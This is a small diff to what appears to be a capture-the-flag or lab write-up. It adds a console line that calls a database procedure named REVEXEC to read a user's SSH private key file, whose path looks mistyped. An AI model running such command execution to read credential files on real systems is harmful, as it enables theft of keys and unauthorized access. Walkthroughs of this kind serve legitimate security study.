@@ -306,6 +306,9 @@ return s.hasNext() ? s.next() : "";
 ![/etc/hosts](07.png){: width="1200" height="800" }
 
 After executing this, we can execute our commands.
+```console
+CALL REVEXEC('cat /home/ .ssh/id_id_ecdsa');
+```
 
 ![/etc/hosts](08.png){: width="1200" height="800" }
 
